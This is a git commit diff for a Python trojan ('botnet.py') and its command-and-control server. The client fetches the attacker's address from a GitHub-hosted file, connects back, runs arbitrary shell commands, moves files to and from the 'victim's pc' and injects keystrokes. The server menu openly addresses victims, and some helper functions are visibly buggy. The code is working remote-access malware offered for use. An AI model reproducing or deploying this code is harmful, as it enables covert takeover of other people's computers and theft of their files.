76b9b6ead8dc94add8d90ffe6142069f7137182d
indrajith69 <66301495+indrajith69@users.noreply.github.com>
2020-12-25 12:28:40 +0530

    Add files via upload

--- botnet.py
+++ botnet.py
@@ -1,38 +1,115 @@
-import socket , threading , os , subprocess , time , pyautogui
+import socket , threading , os , subprocess , time , pyautogui , requests , base64
 
-def files(server_command):
-	if server_command=='read':
-		client.send('specify the file_name and mode to read'.encode('utf-8'))
-		file , mode = client.recv(1024).decode('utf-8').split()
-		with open(file,mode) as f:
-			client.send(f.read().encode('utf-8'))
+def server_ip(repo):
+	r = requests.get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
+	req=bytes(r.json()['content'],encoding='utf-8')
+	host,port=base64.decodebytes(req).decode('utf8').split(':')
+	return host,int(port)
 
-	elif server_command=='write':
-		client.send('specify the file_name and mode to write'.encode('utf-8'))
-		file , mode , data= client.recv(1024).decode('utf-8').split()
-		with open(file,mode) as f:
-			f.write(file_data)
-		client.send('file updated'.encode('utf-8'))
-
-def terminal_controll(server_command):
-	global cmd_mode
-	if server_command=='cmd_on':
-		cmd_mode = True
-		client.send('you now have terminal access'.encode('utf-8'))
-
-	elif server_command=='cmd_off':
-		cmd_mode = False
-		client.send('exited from terminal access'.encode('utf-8'))
 	
-def write(option):
+
+def recv_b_file(name,size=1024):
+	with open(name,'wb') as f:
+		while True:
+			file_contents = client.recv(size)
+
+			if not file_contents:
+				break
+			else:
+				f.write(file_contents)
+
+			client.send('s'.encode('utf-8'))
+	print('done')
+
+
+def send_b_file(path,size=1024):
+	file = open(path,'rb')
+
+	file_contents = file.read(size)
+	file_contents=bytearray(file_contents)
+
+	while len(file_contents)>0:
+		try:
+			client.send(file_contents)
+			file_contents = file.read(size)
+			file_contents=bytearray(file_contents)
+			client.recv(1024).decode('utf-8')
+		except Exception as err:
+			print(err)
+
+	file.close()
+	print('done')
+
+
+
+
+
+
+
+def recv_t_file(name,size=1024):
+	with open(name,'wb') as f:
+		while True:
+			file_contents = client.recv(size).decode('utf-8')
+
+			if not file_contents:
+				break
+			else:
+				f.write(file_contents)
+
+			client.send('s'.encode('utf-8'))
+	print('done')
+
+
+def send_t_file(path,size=1024):
+	file = open(path,'r')
+	file_contents = file.read(size)
+
+	while len(file_contents)>0:
+		try:
+			client.send(file_contents).encode('utf-8')
+			file_contents = file.read(size)
+			client.recv(1024).decode('utf-8')
+		except Exception as err:
+			print(err)
+
+	file.close()
+	print('done')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+def keyboard(option,size=1024):
 	if option==1:
-		for i in client.recv(1024).decode('utf-8'):
-			pyautogui.typewrite(i)
+		while True:
+			file_contents = client.recv(size).decode('utf-8')
+
+			if not file_contents:
+				break
+			else:
+				for i in file_contents:
+					pyautogui.typewrite(i)
+
+			client.send('s'.encode('utf-8'))
+
+		print('done')
+
+
 	elif option==2:
 		while True:
-			string = client.recv(1024).decode('utf-8')
+			string = client.recv(size).decode('utf-8')
 			if string=='exit':
-				break
+				client.send('exited'.encode('utf-8'))
+				return
 			for i in string:
 				pyautogui.typewrite(i)
 
@@ -42,11 +119,37 @@ def demo():
 	pass
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def trojan():
-	global client,cmd_mode
-	HOST = '192.168.43.98'  ######
-	PORT = 9090
-	cmd_mode = False
+	global client
+	HOST,PORT = server_ip('server_address')
 
 	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	client.connect((HOST, PORT))
@@ -54,30 +157,40 @@ def trojan():
 	while True:
 		server_command = client.recv(1024).decode('utf-8')
 
-		if server_command[:3]=='cmd':
-			terminal_controll(server_command)
-			continue
+		if server_command=='send binary file':
+			name = client.recv(1024).decode('utf-8')
+			recv_b_file(name,102400)
 
-		elif server_command[:4] in ('read','write'):
-			files(server_command)
-			continue
+		elif server_command=='send text file':
+			name = client.recv(1024).decode('utf-8')
+			recv_t_file(name,102400)
+
+		elif server_command=='recieve binary file':
+			path = client.recv(1024).decode('utf-8')
+			send_b_file(path,102400)
+
+		elif server_command=='recieve text file':
+			path = client.recv(1024).decode('utf-8')
+			send_t_file(path,102400)
+
+
+
+
+
+
+
 
 		elif server_command[:2]=='cd':
 			os.chdir(server_command.split()[1])
 			client.send(os.getcwd().encode('utf-8'))
-			continue
 
-		elif server_command=='type':
+		elif server_command=='keyboard access':
 			option=int(client.recv(1024).decode('utf-8'))
-			write(option)
+			keyboard(option)
 
-
-
-		if cmd_mode:
+		else:
 			p1=subprocess.run(server_command,shell=True,capture_output=True,text=True)
 			client.send(p1.stdout.encode('utf-8'))
-		else:
-			print(server_command)
 
 
 		client.send('\ncommand was executed\n'.encode('utf-8'))
@@ -90,8 +203,10 @@ def trojan():
 
 
 
-t1=threading.Thread(target=demo)
+'''t1=threading.Thread(target=demo)
 t2=threading.Thread(target=trojan)
 
 t1.start()
-t2.start()
+t2.start()'''
+
+trojan()
--- server.py
+++ server.py
@@ -1,9 +1,59 @@
-import socket,time
+import socket,time,psutil,colorama,os,subprocess
 from pynput.keyboard import Listener
+from colorama import Fore,Back,Style
+
+colorama.init()
 string = ''
 
 
-def script():
+
+def header(HOST,PORT):
+	print(Fore.CYAN+Style.BRIGHT+f'server started at {HOST}:{PORT}')
+	print(Fore.RED+Style.BRIGHT+"""main commands:
+----------------
+1)send binary file     --> to send binary files like images/videos/executables etc to vivtim's pc
+2)send text file       --> to send text files like python files/csv's etc to victims pc
+3)recieve binary file  --> to download binary files from victim's pc
+4)recieve text file    --> to download text files from victim's pc
+5)keyboard access      --> gives controll of the victim's keyboard
+6)script_mode          --> to run commands stored in a text file
+7)<any terminal commands>
+8)exit""")
+	print(Fore.CYAN+Style.BRIGHT)
+
+
+def get_ip_addresses():
+	family = socket.AF_INET
+	for interface, snics in psutil.net_if_addrs().items():
+		for snic in snics:
+			if snic.family == family and interface=='wlp2s0':
+				return snic.address
+
+
+def update_ip(HOST,PORT):
+	if 'ip' not in os.listdir():
+		os.mkdir('ip')
+		os.chdir('ip')
+		subprocess.run('git init',shell=True)
+		subprocess.run('git remote add origin git@github.com:indrajith69/server_address.git',shell=True)
+		subprocess.run('git branch -M master',shell=True)
+		os.chdir('..')
+
+	os.chdir('ip')
+	ip_address=str(HOST)+':'+str(PORT)
+
+	with open('ip_address.txt','w') as f:
+		f.write(ip_address)
+
+	subprocess.run('git add ip_address.txt',shell=True)
+	subprocess.run("git commit -m 'n ip'",shell=True)
+	subprocess.run('git push origin --delete master',shell=True)
+	subprocess.run('git push origin master',shell=True)
+
+	os.chdir('..')
+
+
+def script_mode():
 	path = input("enter the path : ")
 	with open(path,'r') as f:
 		for line in f.readlines():
@@ -14,32 +64,114 @@ def script():
 				print()
 				print(client.recv(1024).decode('utf-8'))
 
-def write():
-	client.send('write'.encode('utf-8'))
-	print(client.recv(1024).decode('utf-8'))
+
+def send_b_file(size=1024):
+	path = input('enter the path of the file : ')
+	name = input('enter the name for the file : ')
+	client.send(name.encode('utf-8'))
+	file = open(path,'rb')
+
+	file_contents = file.read(size)
+	file_contents=bytearray(file_contents)
+
+	while len(file_contents)>0:
+		try:
+			client.send(file_contents)
+			file_contents = file.read(size)
+			file_contents=bytearray(file_contents)
+			client.recv(1024).decode('utf-8')
+		except Exception as err:
+			print(err)
+
+	file.close()
+	print('done')
+
+
+def recv_b_file(size=1024):
+	path = input('enter the path of the file : ')
+	name = input('enter the name for the file : ')
+	client.send(path.encode('utf-8'))
+
+
+	with open(name,'wb') as f:
+		while True:
+			file_contents = client.recv(size)
+
+			if not file_contents:
+				break
+			else:
+				f.write(file_contents)
+
+			client.send('s'.encode('utf-8'))
+	print('done')
+
+
+
+def send_t_file(size=1024):
 	file = input('enter the path of the file : ')
 	name = input('enter the name for the file : ')
-	mode = input('enter the mode for the file : ')
 
-	if len(mode)==2:
-		f=open(file,'rb')
-	else:
-		f=open(file,'r')
+	f=open(file,'r')
 
-	client.send(f'{name} {mode} {f.read()}'.encode('utf-8'))
+	file_contents = file.read(size)
+
+	while len(file_contents)>0:
+		try:
+			client.send(file_contents).encode('utf-8')
+			file_contents = file.read(size)
+			client.recv(1024).decode('utf-8')
+		except Exception as err:
+			print(err)
+
 	f.close()
-	print(client.recv(1024).decode('utf-8'))
+	print('done')
 
 
-def type():
-	client.send('type'.encode('utf-8'))
-	option=int(input('enter ur choice:\n1)from a file\n2)live\noption : '))
-	client.send(str(option).encode('utf-8'))
-	if option==1:
+def recv_t_file(size=1024):
+	path = input('enter the path of the file : ')
+	name = input('enter the name for the file : ')
+	client.send(path.encode('utf-8'))
+
+
+	with open(name,'w') as f:
+		while True:
+			file_contents = client.recv(size).decode('utf-8')
+
+			if not file_contents:
+				break
+			else:
+				f.write(file_contents)
+
+			client.send('s'.encode('utf-8'))
+	print('done')
+
+
+
+
+
+
+
+def keyboard(size=1024):
+	option=input('enter ur choice:\n1)from a file\n2)live\noption : ')
+	client.send(option.encode('utf-8'))
+	if option=='1':
 		file=input('enter the path of the file : ')
-		with open(file,'r') as f:
-			client.send(f.read().encode('utf-8'))
-	elif option==2:
+		f=open(file,'r')
+		file_contents = file.read(size)
+
+		while len(file_contents)>0:
+			try:
+				client.send(file_contents).encode('utf-8')
+				file_contents = file.read(size)
+				client.recv(1024).decode('utf-8')
+			except Exception as err:
+				print(err)
+
+		file.close()
+		print('done')
+
+
+	elif option=='2':
 		def send_keystrokes(key):
 			key = str(key)
 			global string
@@ -47,9 +179,11 @@ def type():
 			if key=='Key.enter':
 				if string=='exit':
 					client.send(string.encode('utf-8'))
+					print(client.recv(size).decode('utf-8'))
 					return
 				else:
-					client.send(string+'\n'.encode('utf-8'))
+					string=string+'\n'
+					client.send(string.encode('utf-8'))
 					string=''
 
 			elif key=='Key.space':
@@ -60,6 +194,7 @@ def type():
 
 			else:
 				string+=key.replace("'","")
+
 		with Listener(on_press=send_keystrokes) as l:
 			l.join()
 	else:
@@ -70,43 +205,73 @@ def type():
 
 
 
-def server():
+
+
+
+def server(PORT=5050):
 	global client
-	HOST = '192.168.43.98'
-	PORT = 9090
+	HOST = get_ip_addresses()
+	PORT = PORT
+
+	header(HOST,PORT)
+	update_ip(HOST,PORT)
 
 	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	server.bind((HOST, PORT))
 					
 	server.listen()
 
+	print('\n\n\nserver started\n\nwaiting for a connection')
 	client,address = server.accept()
 	print(f'connected to {address}\n')
 
 	while True:
-		command = input('Enter a command : ')
-
-		if command=='scripts':
-			script()
-
-		elif command=='write':
-			write()
-
-		elif command=='type':
-			type()
-
-		else:
-			client.send(command.encode('utf-8'))
-			print()
-			print(client.recv(1024).decode('utf-8'))
+		try:
+			command = input('Enter a command : ')
 
 
+			if command=='send binary file':
+				client.send(command.encode('utf-8'))
+				send_b_file(102400)
 
-print("""
-cmd_on / cmd_off  --> turns on / off of terminal access
-type              --> gives controll of the victim's keyboard
-read / write      --> allows to read and write files of victim's pc
-cd                --> to change dir , since cd command in terminal mode does not work for some reason
-""")
+			elif command=='send text file':
+				client.send(command.encode('utf-8'))
+				send_t_file(102400)
 
-server()
+			elif command=='recieve binary file':
+				client.send(command.encode('utf-8'))
+				recv_b_file(102400)
+
+			elif command=='recieve text file':
+				client.send(command.encode('utf-8'))
+				send_t_file(102400)
+
+
+
+
+			elif command=='keyboard access':
+				client.send(command.encode('utf-8'))
+				keyboard()
+
+			elif command=='script mode':
+				script_mode()
+
+
+			elif command=='exit':
+				break
+
+
+			else:
+				client.send(command.encode('utf-8'))
+				print()
+				print(client.recv(1024).decode('utf-8'))
+
+
+		except Exception as error:
+			print(error)
+
+
+
+
+server(9099)
+#header('192.168.18.3',9090)
